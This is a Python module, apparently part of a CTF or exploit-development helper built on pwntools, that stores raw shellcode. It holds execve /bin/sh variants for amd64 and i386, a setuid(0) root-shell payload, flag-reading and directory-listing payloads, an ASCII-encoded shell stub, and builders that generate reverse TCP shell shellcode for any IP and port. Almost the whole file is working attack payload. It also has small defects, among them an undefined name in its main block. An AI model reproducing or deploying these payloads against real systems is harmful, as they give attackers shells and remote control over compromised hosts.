#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations
from dataclasses import dataclass, field
from typing import Dict, Iterable, Optional, Tuple, Union, Literal
from pwn import pack  # kept for sockaddr builder
from .utils import colorize
import ipaddress

__all__ = [
    "Arch",
    "Shellcode",
    "SHELLCODES",           
    "ShellcodeReigstry",   
    "list_shellcodes",
    "ShellcodeBuilder",
    "hex_shellcode",
    "build_sockaddr_in",
]

COL = colorize()

# CORE TYPES
# --------------------------------------------------------------------------------------
from .ctx import Arch   # Arch = Literal["amd64", "i386", "arm", "aarch64"]
Chars = Union[str, bytes]

@dataclass(frozen=True)
class Shellcode:
    """
    A small, typed container for a shellcode blob.
    - name: identifier, e.g., 'execve_bin_sh', 'reverse_tcp_shell'
    - arch: "amd64" / "i386" / ...
    - blob: the shellcode bytes
    - desc: short description shown in listings
    """
    name: str
    arch: Arch
    blob: bytes
    desc: str = ""

    def dump(self, dump_hex: bool = True, prefix: str = "[+] ") -> None:
        """Pretty-print metadata and optional hex view of this shellcode."""
        base, variant = self.name, None
        if ":" in self.name:
            base, variant = self.name.split(":", 1)
        header = (f"{COL['grn']}{prefix}{COL['clr']}Shellcode: "
                  f"{COL['bold']}{base}{COL['clr']}"
                  + (f" (variant {variant}" if variant else "")
                  + f", {COL['cya']}{self.arch}{COL['clr']}), "
                  f"{len(self.blob)} bytes")
        print(header)
        if self.desc:
            print(f"{COL['grn']}{prefix}{COL['clr']}Description: {self.desc}")
        if dump_hex:
            print(hex_shellcode(self.blob))

# SHELLCODES (arch -> entries)
# --------------------------------------------------------------------------------------
# - execve* entries hold variant dicts: {variant_number: bytes}
SHELLCODES: Dict[Arch, Dict[str, Union[bytes, Dict[int, bytes]]]] = {
    "amd64": {
        # - execve('/bin/sh') family (amd64)
        #   we may care the length of the execve shellcodes
        #
        # 27B classic "h0e" variant. Pushes "/bin//sh" and args, sets rax=59, syscall
        "execve_bin_sh": {
            27: (
                b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
                b"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
                b"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
                b"\x3b\x0f\x05"
            ),
            # 30B — builds "//bin/sh" in RBX, shifts, pushes argv = ["/bin/sh", NULL]
            # rax=0 for NULLs, rdi=&"/bin/sh", rsi=&argv, rdx=NULL, rax=59 -> syscall
            30: (
                b"\x48\x31\xd2"                                  # xor rdx, rdx
                b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov rbx, 0x68732f6e69622f2f
                b"\x48\xc1\xeb\x08"                              # shr rbx, 8
                b"\x53"                                          # push rbx
                b"\x48\x89\xe7"                                  # mov rdi, rsp
                b"\x50"                                          # push rax
                b"\x57"                                          # push rdi
                b"\x48\x89\xe6"                                  # mov rsi, rsp
                b"\xb0\x3b"                                      # mov al, 59
                b"\x0f\x05"                                      # syscall
            )
        },
        # 29B — "execveat" trick; builds "/bin//sh" and uses r10,rsi/rdi per SYS_execveat.
        "execveat_bin_sh": {
            29: (
                b"\x6a\x42\x58\xfe\xc4\x48\x99\x52"
                b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f"
                b"\x73\x68\x57\x54\x5e\x49\x89\xd0"
                b"\x49\x89\xd2\x0f\x05"
            ),
        },
        # 24B — minimal bash variant; argv/envp NULL. rax=59 -> syscall.
        "execve_bin_bash": {
            24: (
                b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rax, 0x68732f6e69622f; push rax
                b"\x50\x54\x5f"                              # push rax? (already pushed) ; push rsp ; pop rdi
                b"\x31\xc0"                                  # xor eax, eax
                b"\x50"                                      # push rax (NULL)
                b"\xb0\x3b"                                  # mov al, 59
                b"\x54\x5a"                                  # push rsp ; pop rdx
                b"\x54\x5e"                                  # push rsp ; pop rsi
                b"\x0f\x05"                                  # syscall
            ),
        },
        # 48B — escalate to UID 0 then exec /bin/sh; exits on failure.
        "setuid0_execve_bin_sh": {
            48: (
                b"\x48\x31\xff"              # xor rdi, rdi          ; rdi=0
                b"\xb0\x69"                  # mov al, 0x69          ; SYS_setuid
                b"\x0f\x05"                  # syscall               ; setuid(0)
                b"\x48\x31\xd2"              # xor rdx, rdx          ; rdx=NULL
                b"\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"  # mov rbx, 0x68732f6e69622fff
                b"\x48\xc1\xeb\x08"          # shr rbx, 8            ; -> "//bin/sh"
                b"\x53"                      # push rbx
                b"\x48\x89\xe7"              # mov rdi, rsp          ; rdi=&"/bin/sh"
                b"\x48\x31\xc0"              # xor rax, rax          ; rax=0
                b"\x50"                      # push rax              ; argv/envp NULL
                b"\x57"                      # push rdi              ; argv[0]=pointer
                b"\x48\x89\xe6"              # mov rsi, rsp          ; rsi=&argv
                b"\xb0\x3b"                  # mov al, 59            ; SYS_execve
                b"\x0f\x05"                  # syscall
                b"\x6a\x01"                  # push 1
                b"\x5f"                      # pop rdi               ; rdi=1 (status)
                b"\x6a\x3c"                  # push 0x3c
                b"\x58"                      # pop rax               ; rax=60 (exit)
                b"\x0f\x05"                  # syscall
            ),
        },
        # - utils (amd64)
        # print ./flag via open/read/write
        "cat_flag": (
            b"\x48\xb8\x01\x01\x01\x01\x01\x01"
            b"\x01\x01\x50\x48\xb8\x2e\x66\x6c"
            b"\x61\x67\x01\x01\x01\x48\x31\x04"
            b"\x24\x6a\x02\x58\x48\x89\xe7\x31"
            b"\xf6\x99\x0f\x05\x41\xba\xff\xff"
            b"\xff\x7f\x48\x89\xc6\x6a\x28\x58"
            b"\x6a\x01\x5f\x99\x0f\x05"
        ),
        # list current directory ($PWD)
        "ls_current_dir": (
            b"\x68\x2f\x2e\x01\x01\x81\x34\x24"
            b"\x01\x01\x01\x01\x48\x89\xe7\x31"
            b"\xd2\xbe\x01\x01\x02\x01\x81\xf6"
            b"\x01\x01\x03\x01\x6a\x02\x58\x0f"
            b"\x05\x48\x89\xc7\x31\xd2\xb6\x03"
            b"\x48\x89\xe6\x6a\x4e\x58\x0f\x05"
            b"\x6a\x01\x5f\x31\xd2\xb6\x03\x48"
            b"\x89\xe6\x6a\x01\x58\x0f\x05"
        ),
    },

    "i386": {
        # - execve('/bin/sh') family (i386) 
        # 21B classic — pushes "/bin//sh", sets up argv/envp, int 0x80 with eax=11
        "execve_bin_sh": {
            21: (
                b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
                b"\x73\x68\x68\x2f\x62\x69\x6e\x89"
                b"\xe3\x31\xc9\xcd\x80"
            ),
            # 23B variant — very common form using push/pop tricks
            23: (
                b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
                b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
                b"\x53\x89\xe1\xb0\x0b\xcd\x80"
            ),
            # 28B — explicit register moves (ebx/ecx/edx), exits after exec failure
            28: (
                b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
                b"\x68\x2f\x62\x69\x6e\x89\xe3\x89"
                b"\xc1\x89\xc2\xb0\x0b\xcd\x80\x31"
                b"\xc0\x40\xcd\x80"
            ),
            # 33B — adds "-p" to argv for a login-like shell behavior (argv trick)
            33: (
                b"\x6a\x0b\x58\x99\x52\x66\x68\x2d"
                b"\x70\x89\xe1\x52\x6a\x68\x68\x2f"
                b"\x62\x61\x73\x68\x2f\x62\x69\x6e"
                b"\x89\xe3\x52\x51\x53\x89\xe1\xcd"
                b"\x80"
            ),
            # 49B staged — self-referential /bin/dash string; compact and reloc-safe
            49: (
                b"\xeb\x18\x5e\x31\xc0\x88\x46\x09"
                b"\x89\x76\x0a\x89\x46\x0e\xb0\x0b"
                b"\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e"
                b"\xcd\x80\xe8\xe3\xff\xff\xff\x2f"
                b"\x62\x69\x6e\x2f\x64\x61\x73\x68"
                b"\x41\x42\x42\x42\x42\x43\x43\x43"
                b"\x43"
            ),
        },
        # - utils (i386) 
        # open("./flag"), read, write to stdout
        "cat_flag": (
            b"\x6a\x67\x68\x2f\x66\x6c\x61\x89"
            b"\xe3\x31\xc9\x31\xd2\x6a\x05\x58"
            b"\xcd\x80\x6a\x01\x5b\x89\xc1\x31"
            b"\xd2\x68\xff\xff\xff\x7f\x5e\x31"
            b"\xc0\xb0\xbb\xcd\x80"
        ),
        # list $PWD via getdents/write loop
        "ls_current_dir": (
            b"\x68\x01\x01\x01\x01\x81\x34\x24"
            b"\x2f\x2e\x01\x01\x89\xe3\xb9\xff"
            b"\xff\xfe\xff\xf7\xd1\x31\xd2\x6a"
            b"\x05\x58\xcd\x80\x89\xc3\x89\xe1"
            b"\x31\xd2\xb6\x02\x31\xc0\xb0\x8d"
            b"\xcd\x80\x6a\x01\x5b\x89\xe1\x31"
            b"\xd2\xb6\x02\x6a\x04\x58\xcd\x80"
        ),
    },
}


# REGISTRY
# --------------------------------------------------------------------------------------
class ShellcodeReigstry:
    """
    Facade over global SHELLCODES with robust retrieval.
    Key features:
      - name parsing: "name", "name:variant", "arch:name", "arch:name:variant"
      - variant selection via `variant=` or auto-pick with `prefer=("min"|"max")`
      - fuzzy single-hit match if exact name is missing (substring)
      - returns a dataclass Shellcode

    e.g.,
    # exact, with arch arg
    sc = ShellcodeReigstry.get("amd64", "execve_bin_sh")     # auto-picks min
    sc = ShellcodeReigstry.get("i386", "execve_bin_sh", variant=33) # picks long

    # composite keys (no arch arg)
    sc = ShellcodeReigstry.get(None, "amd64:execve_bin_sh:27")
    sc = ShellcodeReigstry.get(None, "i386:execve_bin_sh")   # picks 21 by default

    # fuzzy single-hit
    sc = ShellcodeReigstry.get("amd64", "ls_")               # matches 'ls_current_dir'
    """

    @staticmethod
    def get(
        arch: Optional[Arch],
        key: str,
        *,
        variant: Optional[int] = None,
        prefer: Literal["min", "max"] = "min",
        desc: Optional[str] = None,
    ) -> Shellcode:
        """
        @arch: Optional[Arch]
            Architecture (e.g., "amd64", "i386"). If None, allow "arch:name[:variant]" in key.
        @key: str
            Name or composite key:
              - "execve_bin_sh"
              - "execve_bin_sh:27"
              - "amd64:execve_bin_sh"
              - "amd64:execve_bin_sh:27"
        @variant: Optional[int]
            Explicit variant number for families (e.g., 21/27/33/etc).
        @prefer: Literal["min","max"]
            If no variant provided for a family, pick the min or max variant number.
        @desc: Optional[str]
            Optional override/annotation for the Shellcode.desc.
        """
        # parse composite
        p_arch, p_name, p_var = ShellcodeReigstry._parse_key(arch, key)
        if variant is None:
            variant = p_var

        # fetch table for arch
        try:
            table = SHELLCODES[p_arch]
        except KeyError:
            raise KeyError(f"Unknown arch '{p_arch}'. Known: {', '.join(sorted(SHELLCODES))}")

        # exact name hit?
        item = table.get(p_name)

        # fuzzy fallback (single hit) if not found
        if item is None:
            candidates = [n for n in table.keys() if p_name in n]
            if len(candidates) == 1:
                p_name = candidates[0]
                item = table[p_name]

        if item is None:
            raise KeyError(
                f"No payload named '{p_name}' for arch '{p_arch}'. "
                f"Available: {', '.join(sorted(table.keys()))}"
            )

        # If bytes, done.
        if isinstance(item, (bytes, bytearray)):
            return Shellcode(
                name=f"{p_name}",
                arch=p_arch,
                blob=bytes(item),
                desc=desc or p_name,
            )

        # Otherwise it's a family (dict of variants)
        variants: Dict[int, bytes] = item  # type: ignore[assignment]
        chosen = ShellcodeReigstry._select_variant(variants, variant, prefer)
        return Shellcode(
            name=f"{p_name}:{chosen}",
            arch=p_arch,
            blob=variants[chosen],
            desc=desc or f"{p_name} (variant {chosen})",
        )

    @staticmethod
    def names(arch: Optional[Arch] = None) -> Iterable[str]:
        """
        Yield payload identifiers.
          - families → 'arch:name:variant'
          - singletons → 'arch:name'
        """
        if arch is None:
            for a in sorted(SHELLCODES.keys()):
                yield from ShellcodeReigstry.names(a)
            return

        entries = SHELLCODES.get(arch, {})
        for name, item in entries.items():
            if isinstance(item, dict):
                for v in sorted(item):
                    yield f"{arch}:{name}:{v}"
            else:
                yield f"{arch}:{name}"

    # - Internals
    @staticmethod
    def _parse_key(
        arch: Optional[Arch],
        key: str
    ) -> Tuple[Arch, str, Optional[int]]:
        """
        Returns (arch, name, variant_or_None) from inputs.
        """
        parts = key.split(":")
        if arch is None:
            if len(parts) == 1:
                raise ValueError(
                    "arch is None but key lacks arch prefix. "
                    "Use 'arch:name[:variant]' or pass arch separately."
                )
            if len(parts) not in (2, 3):
                raise ValueError(f"Invalid key format: {key!r}")
            p_arch = parts[0]  # type: ignore[assignment]
            p_name = parts[1]
            p_var = int(parts[2]) if len(parts) == 3 else None
        else:
            if len(parts) == 1:
                p_arch, p_name, p_var = arch, parts[0], None
            elif len(parts) == 2:
                # tolerate 'name:variant'
                p_arch, p_name, p_var = arch, parts[0], int(parts[1])
            else:
                # tolerate redundant 'arch:name[:variant]' if arch matches
                if parts[0] != arch:
                    raise ValueError(f"Ambiguous arch: got arg '{arch}' but key '{key}'")
                if len(parts) == 2:
                    p_arch, p_name, p_var = arch, parts[1], None
                elif len(parts) == 3:
                    p_arch, p_name, p_var = arch, parts[1], int(parts[2])
                else:
                    raise ValueError(f"Invalid key format: {key!r}")
        return p_arch, p_name, p_var  # type: ignore[return-value]

    @staticmethod
    def _select_variant(variants: Dict[int, bytes], variant: Optional[int], prefer: Literal["min","max"]) -> int:
        if variant is not None:
            if variant not in variants:
                raise KeyError(
                    f"Variant {variant} not found. Available: {', '.join(map(str, sorted(variants)))}"
                )
            return variant
        # auto-pick per preference
        keys = sorted(variants)
        return keys[0] if prefer == "min" else keys[-1]

# - Convenience lister
def list_shellcodes(arch: Optional[Arch] = None) -> Iterable[str]:
    yield from ShellcodeReigstry.names(arch)


# UTILS
# --------------------------------------------------------------------------------------
def hex_shellcode(shellcode: Chars) -> str:
    """
    Convert bytes (or latin-1 str) to '\\x..' form.
    e.g.,
        >>> hex_shellcode(b"\\x90\\x90\\xcc")
        '\\x90\\x90\\xcc'
        >>> hex_shellcode("ABC")   # latin-1 string
        '\\x41\\x42\\x43'
    """
    if isinstance(shellcode, str):
        shellcode = shellcode.encode("latin-1")
    return "".join(f"\\x{b:02x}" for b in shellcode)

def build_sockaddr_in(ip: str, port: int) -> bytes:
    """
    Build a 16-byte sockaddr_in buffer for connect().

        struct sockaddr_in {
            sa_family_t    sin_family; // 2 bytes
            in_port_t      sin_port;   // 2 bytes (big-endian)
            struct in_addr sin_addr;   // 4 bytes (big-endian)
            unsigned char  sin_zero[8];// 8 bytes padding
        };

    Example:
        >>> build_sockaddr_in("127.0.0.1", 4444)
        b'\\x02\\x00\\x11\\\\\\x7f\\x00\\x00\\x01' + b'\\x00' * 8
    """
    try:
        addr = ipaddress.IPv4Address(ip)
    except Exception as e:
        raise ValueError(f"Invalid IPv4 address: {ip!r}") from e
    if not (0 <= port <= 65535):
        raise ValueError(f"Port out of range: {port}")

    # AF_INET (2, little), port (big), addr (big), zero padding (64 bits)
    return (
        pack(2,  word_size=16, endianness="little")
        + pack(port, word_size=16, endianness="big")
        + pack(int(addr), word_size=32, endianness="big")
        + pack(0, word_size=64)
    )


# SHELLCODE BUILDERS
# --------------------------------------------------------------------------------------
@dataclass
class ShellcodeBuilder:
    """Composable shellcode factory with arch-aware helpers."""
    arch: Arch

    def build_alpha_shellcode(
        self,
        reg: Literal["rax","rbx","rcx","rdx","rdi","rsi","rsp","rbp"]
    ) -> bytes:
        """
        Build an ASCII-only (alphanumeric/printable) self-decoding shellcode stub.
        (Currently only wired for amd64.)
        """
        if self.arch == "amd64":
            reg_seed = {
                "rax": b"P", "rbx": b"S", "rcx": b"Q", "rdx": b"R",
                "rdi": b"W", "rsi": b"V", "rsp": b"T", "rbp": b"U",
            }
            try:
                seed = reg_seed[reg]
            except KeyError:
                raise ValueError(f"Unsupported reg {reg!r}; choose one of {sorted(reg_seed.keys())}")

            # ASCII decoder blob + execve("/bin/sh") payload (kept as-is)
            alpha = (
                b"h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02"
                b"DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n"
                b"060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l"
                b"1n0J0h0a070t"
            )
            return seed + alpha

        if self.arch == "i386":
            raise NotImplementedError("ASCII-only i386 stub not implemented yet")

        raise NotImplementedError(f"Unsupported arch: {self.arch}")

    def build_reverse_tcp_connect(self, ip: str, port: int) -> bytes:
        """
        amd64: socket(AF_INET, SOCK_STREAM, 0) → connect(sock, (ip,port), 16)

        Places a full 16-byte sockaddr_in on the stack:
          [ 0x0002 | port_be | ip_be ] + [ 8 zero bytes ]
        """
        if self.arch != "amd64":
            raise NotImplementedError("reverse-tcp connect only implemented for amd64")
        if not (0 <= port <= 0xFFFF):
            raise ValueError("port must be 0..65535")

        ip_be   = ipaddress.IPv4Address(ip).packed          # 4 bytes
        port_be = port.to_bytes(2, "big")                   # 2 bytes

        # socket(AF_INET=2, SOCK_STREAM=1, 0) -> rax=sock ; edi=sock
        socket_seq = (
            b"\x6a\x29"          # push 41
            b"\x58"              # pop rax
            b"\x99"              # cdq (rdx=0)
            b"\x6a\x02" b"\x5f"  # push 2 ; pop rdi   (AF_INET)
            b"\x6a\x01" b"\x5e"  # push 1 ; pop rsi   (SOCK_STREAM)
            b"\x0f\x05"          # syscall            (socket)
            b"\x97"              # xchg eax, edi      (edi = sock)
        )

        # connect(sock, &sockaddr, 16)
        # rcx <- 0x00000000_???????? where lower 8 bytes are:
        #   0x0002 (AF_INET, LE) | port_be | ip_be
        # Then push rcx (first 8 bytes), push rdx (8x zero) for sin_zero[8].
        connect_seq = (
            b"\xb0\x2a"          # mov al, 42 (SYS_connect)
            b"\x48\xb9\x02\x00"  # movabs rcx, imm64 (we'll splice tail next)
            + port_be + ip_be    # <- completes the immediate for rcx
            + b"\x51"            # push rcx        (sockaddr bytes 0..7)
            + b"\x52"            # push rdx        (8 zero bytes -> sin_zero)
            + b"\x54" b"\x5e"    # push rsp ; pop rsi  (rsi = &sockaddr)
            + b"\xb2\x10"        # mov dl, 16      (addrlen)
            + b"\x0f\x05"        # syscall         (connect)
        )
        return socket_seq + connect_seq

    def build_reverse_tcp_shell(self, ip: str, port: int) -> bytes:
        """
        Reverse TCP shell.

        amd64 flow:
          socket(AF_INET, SOCK_STREAM, 0) ->
          connect(sock, sockaddr_in{AF_INET, port_be, ip_be, zero[8]}, 16) ->
          dup2(sock, 0..2) ->
          execve("/bin/sh", 0, 0)

        i386 flow:
          same logic using socketcall/int 0x80.
        """
        if not (0 <= port <= 0xFFFF):
            raise ValueError("port must be 0..65535")
        ip_be   = ipaddress.IPv4Address(ip).packed
        port_be = port.to_bytes(2, "big")

        if self.arch == "amd64":
            #
            # rax=41 (socket), rdi=AF_INET, rsi=SOCK_STREAM -> sock in rax
            #
            socket_seq = (
                b"\x6a\x29"          # push 41
                b"\x58"              # pop rax
                b"\x99"              # cdq (rdx=0)
                b"\x6a\x02" b"\x5f"  # push 2 ; pop rdi (AF_INET)
                b"\x6a\x01" b"\x5e"  # push 1 ; pop rsi (SOCK_STREAM)
                b"\x0f\x05"          # syscall -> rax = sock
                b"\x97"              # xchg eax, edi  (edi = sock, rax clobber ok)
            )

            #
            # Build sockaddr_in on stack: push 8x zero (sin_zero), then push
            # [02 00 | port_be | ip_be] as a qword via movabs rcx + push rcx.
            #
            sockaddr_prefix = (
                b"\xb0\x2a"          # mov al, 42 (SYS_connect)
                b"\x48\xb9\x02\x00"  # movabs rcx, imm64: 02 00 (AF_INET) + port_be + ip_be
            )
            # rcx imm64 (little-endian encoded) finishes as: port_be + ip_be below:
            sockaddr_imm_tail = port_be + ip_be
            sockaddr_suffix = (
                b"\x51"              # push rcx      (first 8 bytes of sockaddr_in)
                b"\x52"              # push rdx      (8 zero bytes -> sin_zero)
                b"\x54" b"\x5e"      # push rsp ; pop rsi  (rsi = &sockaddr)
                b"\xb2\x10"          # mov dl, 16    (sockaddr len)
                b"\x0f\x05"          # syscall       (connect)
            )

            #
            # dup2 loop: for i=2..0 dup2(sock, i)
            #
            dup2_loop = (
                b"\x6a\x03" b"\x5e"  # push 3 ; pop rsi (start at 3)
                b"\xb0\x21"          # mov al, 33 (SYS_dup2)
                b"\xff\xce"          # dec esi
                b"\x0f\x05"          # syscall
                b"\x75\xf8"          # jnz back (while rsi != 0)
            )

            #
            # execve("/bin/sh", 0, 0)
            #
            execve_seq = (
                b"\x99"              # cdq (rdx=0)
                b"\xb0\x3b"          # mov al, 59
                b"\x52"              # push rdx (null)
                b"\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rcx, "/bin/sh\x00"
                b"\x51" b"\x54" b"\x5f"                      # push rcx ; push rsp ; pop rdi
                b"\x0f\x05"          # syscall
            )

            return socket_seq + sockaddr_prefix + sockaddr_imm_tail + sockaddr_suffix + dup2_loop + execve_seq

        elif self.arch == "i386":
            #
            # socket(AF_INET, SOCK_STREAM, 0) via socketcall
            # eax=0x66 (SYS_socketcall), ebx=1 (SYS_SOCKET)
            #
            # then connect(sock, &sockaddr, 16) via socketcall
            #
            # then dup2(sock, 0..2) and execve("/bin/sh",0,0)
            #
            # This sequence explicitly lays out sockaddr_in on the stack as:
            #   push ip_be (dword)
            #   push port_be (word)
            #   push AF_INET (word)
            #
            sock_seq = (
                b"\x6a\x66" + b"\x58"              # push 0x66 ; pop eax
                + b"\x6a\x01" + b"\x5b"            # push 1 ; pop ebx        (SYS_SOCKET)
                + b"\x31\xd2"                      # xor edx, edx            (proto=0)
                + b"\x52" + b"\x53" + b"\x6a\x02"  # push edx ; push ebx ; push 2
                + b"\x89\xe1"                      # mov ecx, esp            (args)
                + b"\xcd\x80"                      # int 0x80                (socket)
                + b"\x89\xc7"                      # mov edi, eax            (sockfd -> edi)
            )

            #
            # connect(sock, &sockaddr_in, 16) via socketcall
            # sockaddr_in on stack (lowest addr first):
            #   sin_zero[8] (two dwords of zero), ip (dword), port (word), AF_INET (word)
            #
            connect_seq = b"".join([
                b"\x6a\x66", b"\x58",          # eax = SYS_socketcall
                b"\x6a\x03", b"\x5b",          # ebx = 3 (SYS_CONNECT)
                b"\x52", b"\x52",              # push edx ; push edx (8 zero bytes -> sin_zero)
                b"\x68", ip_be,                # push dword ip_be
                b"\x66\x68", port_be,          # push word  port_be
                b"\x66\x6a\x02",               # push word  AF_INET
                b"\x89\xe1",                   # ecx = &sockaddr
                b"\x6a\x10", b"\x51",          # push 16 ; push ecx
                b"\x57",                       # push edi (sockfd)
                b"\x89\xe1",                   # ecx = esp (args to socketcall)
                b"\xcd\x80",                   # int 0x80 (connect)
            ])

            #
            # dup2 loop: dup2(sock, 2), dup2(sock, 1), dup2(sock, 0)
            # For int 0x80: dup2(oldfd,newfd) → ebx=oldfd, ecx=newfd
            #
            dup2_execve = (
                b"\x6a\x02" + b"\x59"      # push 2 ; pop ecx (newfd = 2)
                + b"\x89\xfb"              # mov ebx, edi     (oldfd = sock)
                + b"\xb0\x3f"              # mov al, 63       (dup2)
                + b"\xcd\x80"              # int 0x80
                + b"\x49"                  # dec ecx
                + b"\x79\xf9"              # jns -7           (back to mov al,63)
                # execve("/bin/sh", 0, 0)
                + b"\xb0\x0b"              # mov al, 11       (execve)
                + b"\x52"                  # push edx         (NULL)
                + b"\x68\x2f\x2f\x73\x68"  # push "//sh"
                + b"\x68\x2f\x62\x69\x6e"  # push "/bin"
                + b"\x89\xe3"              # mov ebx, esp     (path)
                + b"\xcd\x80"              # int 0x80
            )

            return sock_seq + connect_seq + dup2_execve

        raise NotImplementedError(f"Unsupported arch: {self.arch}")


if __name__ == "__main__":
    # tiny smoke: hex rendering + list registered names
    print(hex_shellcode(b"AB\x00C"))
    print(sorted(SHELLCODESTORE.names()))

